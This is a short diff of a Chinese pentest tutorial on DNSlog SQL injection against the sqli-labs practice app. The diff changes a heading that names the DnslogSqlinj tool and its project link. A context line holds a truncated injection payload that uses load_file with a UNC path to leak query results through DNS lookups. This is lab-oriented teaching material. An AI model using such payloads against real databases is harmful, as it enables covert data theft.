@@ -344,7 +344,7 @@ http://localhost/pentest/sqlilabs/Less-9/?id=1'and load_file(concat('\\\\',(sele
 
 ![1626268884_60eee4d43a1d2a403355a.png!small?1626268884241](https://image.3001.net/images/20210714/1626268884_60eee4d43a1d2a403355a.png!small?1626268884241)
 
-## py-Dnslogsqlinj-dnslog 注入演示脚本演示(实际案例)
+## py-Dnslogsqlinj工具使用——dnslog 注入演示脚本演示(实际案例)
 
 项目地址：https://github.com/ADOOO/DnslogSqlinj  DNSlog注入工具
 
